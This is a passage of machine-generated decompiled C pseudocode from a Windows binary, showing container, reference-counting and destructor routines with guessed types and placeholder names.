  LOBYTE(v15) = 3;
  sub_10022F16((int)v7, v9);
  LOBYTE(v15) = 4;
  sub_10022EDC((int)v7, v13);
  LOBYTE(v15) = 5;
  if ( sub_1000DE8B(0, (int)v13, 0x2Du) != -1 )
  {
    v4 = sub_1000DE8B(0, (int)v13, 0x2Du);
    sub_1000D836(-2, (int)v13, v11, v4);
    LOBYTE(v15) = 6;
    sub_1000D17D(v10, &word_10130470);
    LOBYTE(v15) = 7;
    sub_1000D9E4((int)v10, v11, v13, 0);
    LOBYTE(v15) = 6;
    sub_1000D3AD(v10);
    sub_10022EA2((int)v7, v12);
    LOBYTE(v15) = 8;
    sub_1000D575((int)v12, v11);
    sub_1000D575((int)v12, dword_101939D0);
    sub_1000D575((int)v12, v13);
    v5 = sub_1000D5FF(v10, (int)v9, v12);
    LOBYTE(v15) = 9;
    sub_10001236(v5 + 1, a1 + 1);
    LOBYTE(v15) = 8;
    sub_1000D3AD(v10);
    LOBYTE(v15) = 6;
    sub_1000D3AD(v12);
    LOBYTE(v15) = 5;
    sub_1000D3AD(v11);
  }
  sub_1000D9E4((int)&unk_101939C0, dword_101939E0, a1, 0);
  sub_1000D9E4((int)&unk_101939D8, dword_101939C8, a1, 0);
  LOBYTE(v15) = 4;
  sub_1000D3AD(v13);
  LOBYTE(v15) = 3;
  sub_1000D3AD(v9);
  LOBYTE(v15) = 2;
  sub_1000D3AD(v8);
  LOBYTE(v15) = 0;
  sub_10022DF9(v7);
  return a1;
}
// 101939C8: using guessed type _DWORD dword_101939C8[2];
// 101939D0: using guessed type _DWORD dword_101939D0[2];
// 101939E0: using guessed type _DWORD dword_101939E0[2];
// 10056793: using guessed type int var_7C[14];
// 10056793: using guessed type LONG var_1C[2];

//----- (1005695A) --------------------------------------------------------
_DWORD *__stdcall sub_1005695A(int a1, _DWORD *a2)
{
  sub_10012A85(a2, a1 + 76);
  return a2;
}

//----- (10056994) --------------------------------------------------------
_DWORD *__cdecl sub_10056994(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  int v3; // ecx
  _DWORD *v4; // esi
  _DWORD *v6; // eax
  volatile LONG *v7; // ecx
  _DWORD *v8[2]; // [esp+Ch] [ebp-24h] BYREF
  void *v9[2]; // [esp+14h] [ebp-1Ch] BYREF
  int v10; // [esp+1Ch] [ebp-14h]
  char v11; // [esp+23h] [ebp-Dh] BYREF
  int v12; // [esp+2Ch] [ebp-4h]

  v10 = 0;
  sub_10050BD5(&v11);
  sub_1000EDE4((int *)(dword_101831D4 + 100), v8);
  v12 = 1;
  (*(void (__thiscall **)(int, void **))(*(_DWORD *)(dword_101831D4 + 84) + 12))(dword_101831D4 + 84, v9);
  LOBYTE(v12) = 2;
  while ( 1 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v9[0] + 4))(v9[0]) )
    {
      v4 = a1;
      sub_10057D8D(a1);
      goto LABEL_6;
    }
    v2 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v9[0] + 12))(v9[0]);
    if ( (**(unsigned __int8 (__thiscall ***)(_DWORD, int))*v2)(*v2, a2) )
      break;
    sub_10021F56(v3, (int)v9[0]);
  }
  v6 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v9[0] + 12))(v9[0]);
  v7 = (volatile LONG *)v6[1];
  v4 = a1;
  a1[1] = v7;
  *a1 = *v6;
  InterlockedIncrement(v7);
LABEL_6:
  v10 = 1;
  LOBYTE(v12) = 1;
  sub_1002228F(v9);
  LOBYTE(v12) = 0;
  sub_1000EDA4(v8);
  return v4;
}
// 100569F7: variable 'v3' is possibly undefined
// 10050BD5: using guessed type _DWORD __stdcall sub_10050BD5(_DWORD);
// 101831D4: using guessed type int dword_101831D4;

//----- (10056A59) --------------------------------------------------------
int __cdecl sub_10056A59(int a1)
{
  sub_1000B36F(dword_10186904, a1);
  return a1;
}
// 10186904: using guessed type _DWORD dword_10186904[5];

//----- (10056A91) --------------------------------------------------------
int __thiscall sub_10056A91(int this, int a2)
{
  sub_10056FB7((void *)(this + 4), a2);
  return a2;
}

//----- (10056AC7) --------------------------------------------------------
int __thiscall sub_10056AC7(int this, int a2)
{
  sub_10056FB7((void *)(this + 20), a2);
  return a2;
}

//----- (10056AFD) --------------------------------------------------------
_DWORD *__thiscall sub_10056AFD(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x1Cu);
  if ( v3 )
    v4 = sub_10056FEA(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10056B78) --------------------------------------------------------
_DWORD *__thiscall sub_10056B78(void *this, _DWORD *a2, void *Block)
{
  unsigned int v4; // eax
  void *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  v5 = Block;
  if ( (unsigned int)Block > v4 )
  {
    v6 = sub_1000E8EF(&Block);
    sub_100078FE((int)v6);
  }
  v7 = operator new(0xCu);
  Block = v7;
  if ( v7 )
  {
    v7[1] = this;
    *v7 = &off_101023F8;
    v7[2] = v5;
  }
  else
  {
    v7 = 0;
  }
  sub_10050B91(a2, (int)v7);
  return a2;
}
// 101023F8: using guessed type int (__thiscall *off_101023F8)(void *Block, char);

//----- (10056C02) --------------------------------------------------------
void __thiscall sub_10056C02(int *this)
{
  *this = (int)off_1010465C;
  sub_1001ECA1(this + 1);
}
// 1010465C: using guessed type int (__thiscall *off_1010465C[2])(void *Block, char);

//----- (10056C2E) --------------------------------------------------------
_DWORD *__stdcall sub_10056C2E(int a1, _DWORD *a2)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a1 + 40);
  *a2 = &off_10102434;
  a2[1] = a1 + 4;
  a2[2] = v2;
  sub_1000ECB1((int *)(a1 + 4));
  return a2;
}
// 10102434: using guessed type int (__thiscall *off_10102434)(void *Block, char);

//----- (10056C79) --------------------------------------------------------
void *__thiscall sub_10056C79(_DWORD *this)
{
  int i; // eax
  int v3; // edi
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10104730;
  v6 = 1;
  for ( i = this[1]; i; i = v3 )
  {
    v3 = *(_DWORD *)(i + 8);
    sub_10056F2A((void **)i);
  }
  v6 = -1;
  return sub_100185A9(this);
}
// 10104730: using guessed type int (__thiscall *off_10104730)(void *Block, char);

//----- (10056CDF) --------------------------------------------------------
_DWORD *__thiscall sub_10056CDF(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10104794;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10104794: using guessed type int (__thiscall *off_10104794)(void *Block, char);

//----- (10056D45) --------------------------------------------------------
_DWORD *__thiscall sub_10056D45(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10104794;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10104794: using guessed type int (__thiscall *off_10104794)(void *Block, char);

//----- (10056DAB) --------------------------------------------------------
int *__thiscall sub_10056DAB(void *this, int *a2, unsigned int a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  unsigned int v7; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v4 )
  {
    v5 = sub_1000E8EF(&a3);
    sub_100078FE((int)v5);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( a3 )
  {
    v7 = a3;
    do
    {
      sub_10021F56(v6, *a2);
      --v7;
    }
    while ( v7 );
  }
  return a2;
}
// 10056E04: variable 'v6' is possibly undefined

//----- (10056E1F) --------------------------------------------------------
void __thiscall sub_10056E1F(void *this, int a2, int a3)
{
  void *v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1002228F(v3);
}

//----- (10056E60) --------------------------------------------------------
void __thiscall sub_10056E60(void *this)
{
  void *v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(void *))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1002228F(v1);
}

//----- (10056EA7) --------------------------------------------------------
int *__thiscall sub_10056EA7(void *this)
{
  int *result; // eax
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *(_DWORD *)this = &off_10104770;
  v2[6] = 0;
  result = (int *)*((_DWORD *)this + 1);
  if ( result )
    return sub_10056F79(*((int **)this + 1));
  return result;
}
// 10104770: using guessed type int (__thiscall *off_10104770)(void *Block, char);

//----- (10056EEC) --------------------------------------------------------
int *__thiscall sub_10056EEC(int *Block, char a2)
{
  sub_10056C02(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10056F0B) --------------------------------------------------------
_DWORD *__thiscall sub_10056F0B(_DWORD *Block, char a2)
{
  sub_10056C79(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10056F2A) --------------------------------------------------------
void **__stdcall sub_10056F2A(void **Block)
{
  sub_10057DCD(Block);
  j__free(Block);
  return Block;
}

//----- (10056F5A) --------------------------------------------------------
void *__thiscall sub_10056F5A(void *Block, char a2)
{
  sub_10056EA7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10056F79) --------------------------------------------------------
int *__stdcall sub_10056F79(int *Block)
{
  sub_10056C02(Block + 11);
  sub_10057B0C(Block + 2);
  j__free(Block);
  return Block;
}

//----- (10056FB7) --------------------------------------------------------
int __thiscall sub_10056FB7(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (10056FEA) --------------------------------------------------------
_DWORD *__stdcall sub_10056FEA(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10104774;
  a1[2] = &off_10104660;
  sub_10050B91(a1 + 4, 0);
  a1[6] = 0;
  return a1;
}
// 10104660: using guessed type int (__thiscall *off_10104660)(void *Block, char);
// 10104774: using guessed type int (__stdcall *off_10104774)(char);

//----- (1005703C) --------------------------------------------------------
_DWORD *__thiscall sub_1005703C(_DWORD *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp-4h] [ebp-Ch]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[6]);
  v5 = this[6];
  this[3] = *v2;
  v3 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v5);
  sub_1005759D(this + 4, v3);
  return this + 2;
}

//----- (10057071) --------------------------------------------------------
void __thiscall sub_10057071(_DWORD *this)
{
  ++this[6];
}

//----- (10057075) --------------------------------------------------------
void __noreturn sub_10057075()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 165);
}
// 10057075: using guessed type char var_14[16];

//----- (1005709A) --------------------------------------------------------
void __thiscall sub_1005709A(_DWORD *this)
{
  *this = &off_10104660;
  sub_10020B81(this + 2);
}
// 10104660: using guessed type int (__thiscall *off_10104660)(void *Block, char);

//----- (100570C6) --------------------------------------------------------
int __thiscall sub_100570C6(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100570E2) --------------------------------------------------------
void **__thiscall sub_100570E2(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  void **result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 8);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 8) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 12) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(void ***)(this + 12);
  if ( result )
    result = sub_10056F2A(*(void ***)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (1005716A) --------------------------------------------------------
int *__thiscall sub_1005716A(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  int *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-28h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-24h]
  int v11; // [esp-8h] [ebp-20h]
  volatile LONG *v12; // [esp-4h] [ebp-1Ch]
  int *v13; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v15; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = (int *)&v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_1005727B((int *)Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10057201) --------------------------------------------------------
_DWORD *__thiscall sub_10057201(_DWORD *this, char a2)
{
  sub_1005709A(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1005723C) --------------------------------------------------------
_DWORD *__thiscall sub_1005723C(_DWORD *Block, char a2)
{
  sub_1005709A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1005725B) --------------------------------------------------------
_DWORD *__thiscall sub_1005725B(_DWORD *Block, char a2)
{
  *Block = &off_10104794;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10104794: using guessed type int (__thiscall *off_10104794)(void *Block, char);

//----- (1005727B) --------------------------------------------------------
int *__stdcall sub_1005727B(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  int v5; // ecx
  volatile LONG *v7; // [esp-4h] [ebp-14h]

  v5 = a2;
  v7 = lpAddend;
  a1[1] = (int)lpAddend;
  *a1 = v5;
  InterlockedIncrement(v7);
  a1[2] = a4;
  a1[3] = a5;
  sub_10057DCD((void **)&a2);
  return a1;
}

//----- (100572CC) --------------------------------------------------------
_DWORD *__usercall sub_100572CC@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10040447((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
  return a1;
}

//----- (10057318) --------------------------------------------------------
void *__thiscall sub_10057318(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10104668;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100185A9((_DWORD *)this);
}
// 10104668: using guessed type int (__thiscall *off_10104668)(void *Block, char);

//----- (10057376) --------------------------------------------------------
int __thiscall sub_10057376(_DWORD *this, int *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  int v9; // [esp+14h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013039E);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = v9;
  ++this[1];
  return result;
}

//----- (100573D9) --------------------------------------------------------
int __thiscall sub_100573D9(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013039F);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10057425) --------------------------------------------------------
int __thiscall sub_10057425(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101303CA);
  return this[3] + 4 * a2;
}

//----- (10057446) --------------------------------------------------------
int __thiscall sub_10057446(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101303CB);
  return this[3] + 4 * a2;
}

//----- (10057467) --------------------------------------------------------
int __thiscall sub_10057467(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1005748B) --------------------------------------------------------
int __thiscall sub_1005748B(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (100574CD) --------------------------------------------------------
unsigned int __thiscall sub_100574CD(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013042E);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1005753F) --------------------------------------------------------
unsigned int __thiscall sub_1005753F(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1005759D) --------------------------------------------------------
_DWORD *__usercall sub_1005759D@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10040447((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100575C2) --------------------------------------------------------
int *__thiscall sub_100575C2(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10050C0B(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10057607) --------------------------------------------------------
void *__thiscall sub_10057607(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_101046C8;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10050C0B(v2);
  this[3] = 0;
  v5 = -1;
  return sub_100185A9(this);
}
// 101046C8: using guessed type int (__thiscall *off_101046C8)(void *Block, char);

//----- (10057668) --------------------------------------------------------
void __thiscall sub_10057668(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  int v8; // [esp+Ch] [ebp-14h] BYREF
  volatile LONG *v9; // [esp+10h] [ebp-10h]
  int v10; // [esp+1Ch] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013042F);
  v9 = (volatile LONG *)a2[1];
  v8 = *a2;
  InterlockedIncrement(v9);
  v10 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_1005759D((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  sub_1005759D((_DWORD *)(v7 + 8 * a3), &v8);
  ++this[1];
  v10 = -1;
  sub_10020B81(&v8);
}

//----- (10057705) --------------------------------------------------------
int __thiscall sub_10057705(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10130436);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_1005759D((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1005759D((_DWORD *)(this[3] + 8 * v4), dword_10193D40);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193D40: using guessed type _DWORD dword_10193D40[2];

//----- (1005775F) --------------------------------------------------------
int __thiscall sub_1005775F(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10130437);
  return this[3] + 8 * a2;
}

//----- (10057780) --------------------------------------------------------
int __thiscall sub_10057780(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013046E);
  return this[3] + 8 * a2;
}

//----- (100577A1) --------------------------------------------------------
char *__thiscall sub_100577A1(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10050C0B(v3);
  }
  return result;
}

//----- (100577CA) --------------------------------------------------------
int __thiscall sub_100577CA(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10050C0B(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (100577F1) --------------------------------------------------------
int __thiscall sub_100577F1(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (**)(void))(*this + 4))(); ++i )
    sub_1005759D((_DWORD *)(this[3] + 8 * i), dword_10193D40);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 10193D40: using guessed type _DWORD dword_10193D40[2];

//----- (10057836) --------------------------------------------------------
unsigned int __thiscall sub_10057836(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013046F);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (100578A8) --------------------------------------------------------
unsigned int __thiscall sub_100578A8(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_10057E67, sub_10020B81);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_1005759D((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (10057958) --------------------------------------------------------
void *__thiscall sub_10057958(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
